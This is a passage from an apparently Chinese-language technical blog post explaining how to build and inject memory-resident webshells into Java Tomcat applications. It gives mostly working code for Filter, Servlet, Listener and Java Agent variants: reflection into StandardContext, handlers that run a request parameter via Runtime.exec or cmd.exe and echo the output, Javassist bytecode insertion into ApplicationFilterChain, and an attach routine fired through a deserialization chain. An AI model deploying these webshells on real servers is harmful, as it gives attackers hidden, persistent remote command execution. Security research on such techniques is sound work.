class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="comment">//通过反射获取StandardContext（web应用上下文）</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><p>​Filter型内存马的主干，是创建恶意filter对象，然后创建对应的FilterDef、filterMap和filterConfig对象，因为已经获得了StandardContext对象，将这些信息注册到FilterDefs、filterMaps和filterConfigs即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;bmsk&quot;</span>;</span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//通过反射获取filterConfigs对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="comment">//避免重复</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//新建恶意fliter，并完善对应的单元酱FilterDef</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123; ... &#125;;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    <span class="comment">//将 filterDef 添加到 filterDefs 中</span></span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="comment">//设置 filterMap 的（FilterName，URLPattern），以及 Dispatcher（请求类型）</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    <span class="comment">//将 filterMap 添加到 filterMaps 中</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="comment">//通过反射实例化filterConfig，将其添加到 filterConfigs中</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name,filterConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​接下来访问该web应用的任意servlet，添加“?cmd&#x3D;calc”就能实现命令执行。</p><h3 id="Servlet型内存马"><a href="#Servlet型内存马" class="headerlink" title="Servlet型内存马"></a>Servlet型内存马</h3><p>​正常情况下，在Tomcat中注册一个filter，需要如下步骤：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://www.cnblogs.com/0x3e-time/p/17017131.html</span></span><br><span class="line"><span class="comment">//1.编写一个类，实现Servlet接口，在service方法中实现功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servletDemo</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.在web.xml中配置该servlet类的信息</span></span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;servletDemo&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.bmsk.servletDemo&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;servletDemo&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/demo&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>​调试servlet的注册过程，可知servlet对象封装在StandardWrapper，然后被添加到StandardContext对象的children属性中。servlet也有对应的servletMappings，记录了urlParttern跟所对应的servlet的关系。</p><ul><li>children属性，维护servlet名称和对应的类。</li><li>servletMappings，维护uri路径和servlet名称。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//StandardContext对象的children属性 </span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> HashMap&lt;String, Container&gt; children = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//StandardContext对象的servletMappings属性</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, String&gt; servletMappings = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>​因此，servlet内存马，只需要配置好StandardContext对象的children属性和servletMappings属性即可。Servlet内存马的缺点，是需要“<a href="http://localhost:8080/tomcatShell/shell?cmd=calc%E2%80%9D%E8%BF%99%E6%A0%B7%E5%AF%B9%E6%8C%87%E5%AE%9Aservlet%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8D%E5%83%8FFilter%E5%86%85%E5%AD%98%E9%A9%AC%E5%85%A8%E5%B1%80%E9%83%BD%E5%8F%AF%E3%80%82">http://localhost:8080/tomcatShell/shell?cmd=calc”这样对指定servlet访问，不像Filter内存马全局都可。</a></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.通过request对象反射获取StandardContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">...</span><br><span class="line"><span class="comment">//2.创建恶意servlet对象</span></span><br><span class="line"><span class="type">Servlet</span> <span class="variable">shellServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>()&#123;...&#125;</span><br><span class="line"><span class="comment">//3.将servlet封装在StandardWrapper，包含servlet名称和具体类</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shellServlet.getClass().getSimpleName();</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">wrapper.setName(name);</span><br><span class="line">wrapper.setServlet(shellServlet);</span><br><span class="line"><span class="comment">//4.将StandardWrapper添加到StandardContext对象的children属性</span></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"><span class="comment">//5.将servlet名称和uri路径添加到StandardContext对象的servletMappings属性</span></span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br></pre></td></tr></table></figure><h3 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h3><p>​Listener主要分为三大类，根据其用途可知，监听Request对象的Listener是最适合做内存马的，只要访问服务就能触发操作。</p><ul><li>ServletContext，服务器启动和终止时触发</li><li>Session，有关Session操作时触发</li><li>Request，访问服务时触发</li></ul><p>​ServletContext接口中有addListener方法，ApplicationContext实现了ServletContext，可以把ApplicationContext看成实际意义上的页面级别上下文。ApplicationContext实现的addListener方法，最终调用this.context.addApplicationEventListener(t)，就是把Listener注册到StandardContext。</p><p>​因此，Listener内存马的实现很简单，就是获取StandardContext对象后，调用addApplicationEventListener即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.通过request对象反射获取StandardContext对象</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">...</span><br><span class="line"><span class="comment">//2.创建恶意listener对象</span></span><br><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;...&#125;</span><br><span class="line"><span class="comment">//3.将listener对象添加到StandardContext对象</span></span><br><span class="line">standardContext.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure><p>​相较于Filter型和Servlet型内存马，注入后执行命令时，可以直接获取request对象，Listener型内存马还需要多一步操作：通过ServletRequestEvent获取到request对象。下面给出了通过request对象获取对应的response对象，进行回显的代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;bmsk&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;bmsk&quot;</span>)&#125;).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//通过request对象，获取对应的response对象。可以看出，request也是个封装类。</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">            request.getResponse().getWriter().write(out);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java-Agent型内存马"><a href="#Java-Agent型内存马" class="headerlink" title="Java Agent型内存马"></a>Java Agent型内存马</h3><blockquote><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#39ac31be">https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#39ac31be</a></p></blockquote><p>​系统编写过RASP项目，就很容易理解Agent型内存马了。Agent型内存马，是通过attach模式将agent.jar加载到正在运行的目标程序上，agent.jar遍历目标程序上已经加载的类，对类进行重新定义，在能获取到线程request对象的关键方法上插桩恶意代码。比如插桩在ApplicationFilterChain的doFilter方法，所有请求都需要经过该方法，该方法的参数是request和response对象，在该位置获取request对象的参数和写入回显都很方便，等效于前面的Filter型内存马。</p><p>​运行时JVM提供了com.sun.tools.attach.VirtualMachine的api，可以通过这个类attach jvm，然后通过loadAgent()函数把agent加载进去。Agent型内存马，就是利用attach模式，将agent.jar加载到目标应用上，但需要首先将agent.jar上传到目标服务器，还需要在运行中的诸多Java程序中，猜中目标应用的名称。</p><h4 id="Agent-jar"><a href="#Agent-jar" class="headerlink" title="Agent.jar"></a>Agent.jar</h4><p>1.遍历已加载的类，找到目标类，进行插桩</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">    ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">    Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">    <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">        <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.ClassFileTransformer改变类定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">    className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">            m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;bmsk\&quot;);\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                           <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">            c.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.MANIFEST.MF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;archive&gt;</span><br><span class="line">    &lt;manifestEntries&gt;</span><br><span class="line">        &lt;Project-name&gt;$&#123;project.name&#125;&lt;/Project-name&gt;</span><br><span class="line">        &lt;Project-version&gt;$&#123;project.version&#125;&lt;/Project-version&gt;</span><br><span class="line">        &lt;Agent-Class&gt;AgentMain&lt;/Agent-Class&gt;</span><br><span class="line">        &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">        &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">    &lt;/manifestEntries&gt;</span><br><span class="line">&lt;/archive&gt;</span><br></pre></td></tr></table></figure><h4 id="attach模式下的绑定程序"><a href="#attach模式下的绑定程序" class="headerlink" title="attach模式下的绑定程序"></a>attach模式下的绑定程序</h4><p>​将下面代码写到Payload类的static代码块，通过javassist获取Payload类的字节序列，放到一个sink点是TemplatesImpl类的反序列化链上（比如CC4），在目标应用上触发反序列化，从而执行static代码块的绑定程序。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//需要知道agent.jar的上传位置</span></span><br><span class="line">    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java代码审计\\AgentMemShell-main\\AgentMemShell-main\\target\\AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>;</span><br><span class="line">    <span class="comment">//由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar</span></span><br><span class="line">    java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">    java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">    java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">    Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">    Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">    java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    java.util.List&lt;Object&gt; list = (java.util.List<span class="comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">        java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        java.lang.<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (java.lang.String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">// 列出当前有哪些 JVM 进程在运行</span></span><br><span class="line">        <span class="comment">// 这里的 if 条件根据实际情况进行更改</span></span><br><span class="line">        <span class="keyword">if</span> (name.contains(<span class="string">&quot;rasp-0.0.1-SNAPSHOT&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">            <span class="comment">//运行时JVM提供了com.sun.tools.attach.VirtualMachine的api，可以通过这个类attach jvm，然后通过loadAgent()函数把agent加载进去。</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="javassist-NotFoundException问题解决终极版"><a href="#javassist-NotFoundException问题解决终极版" class="headerlink" title="javassist.NotFoundException问题解决终极版"></a>javassist.NotFoundException问题解决终极版</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">参考：https:<span class="comment">//exp10it.cn/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%88%A9%E7%94%A8-java-agent-%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解决：javassist.NotFoundException: org.apache.catalina.core.ApplicationFilterChain</span></span><br><span class="line"><span class="comment">//premain模式</span></span><br><span class="line">pool.appendSystemPath();</span><br><span class="line">pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));  <span class="comment">//这句是最关键的，甚至attach模式只用这句都可</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line"><span class="comment">//attach模式</span></span><br><span class="line"><span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">    pool.insertClassPath(ccp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br></pre></td></tr></table></figure><h2 id="反序列化注入内存马"><a href="#反序列化注入内存马" class="headerlink" title="反序列化注入内存马"></a>反序列化注入内存马</h2><p>​通过上传jsp的方式注入内存马，会有文件落地，容易被检测到，那我们能否通过反序列化实现注入内存马呢？当然可以，但是，反序列化点并不能直接获取到request对象，而jsp中out、request、response、session等对象都是可以直接获得的。因此，反序列化注入内存马时，需要通过反射获取到线程的request对象，首先要解决的就是，线程的requesy对象那个存储在哪些位置？</p><h3 id="Kingkk师傅之ThreadLocal"><a href="#Kingkk师傅之ThreadLocal" class="headerlink" title="Kingkk师傅之ThreadLocal"></a>Kingkk师傅之ThreadLocal</h3><p>​Kingkk师傅，找到ApplicationFilterChain类的static代码块，当ApplicationDispatcher.WRAP_SAME_OBJECT属性为true时，就会实例化lastServicedRequest、lastServicedResponse （ThreadLocal型），而每个请求的必经之路，ApplicationFilterChain类的internalDoFilter方法，同样发现WRAP_SAME_OBJECT属性为true时，会将request对象和response对象缓存起来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ApplicationFilterChain类的static代码块</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>();</span><br><span class="line">        lastServicedResponse = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lastServicedRequest = <span class="literal">null</span>;</span><br><span class="line">        lastServicedResponse = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...       </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ApplicationFilterChain类的internalDoFilter方法</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(request);</span><br><span class="line">            lastServicedResponse.set(response);</span><br><span class="line">        